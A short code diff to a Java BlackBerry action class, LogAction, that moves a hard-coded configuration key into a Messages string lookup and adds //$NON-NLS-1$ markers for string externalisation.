@@ -9,6 +9,7 @@
 
 package blackberry.action;
 
+import blackberry.Messages;
 import blackberry.Trigger;
 import blackberry.config.ConfAction;
 import blackberry.config.ConfigurationException;
@@ -19,7 +20,7 @@ import blackberry.evidence.Evidence;
 public class LogAction extends SubAction {
 
     //#ifdef DEBUG
-    static Debug debug = new Debug("LogAction", DebugLevel.VERBOSE);
+    static Debug debug = new Debug("LogAction", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private String msg;
@@ -43,11 +44,11 @@ public class LogAction extends SubAction {
 
     protected boolean parse(ConfAction params) {
         try {
-            this.msg = params.getString("text");
+            this.msg = params.getString(Messages.getString("LogAction.1")); //$NON-NLS-1$
         } catch (ConfigurationException e) {
             //#ifdef DEBUG
             debug.error(e);
-            debug.error("parse");
+            debug.error("parse"); //$NON-NLS-1$
             //#endif
             return false;
         }
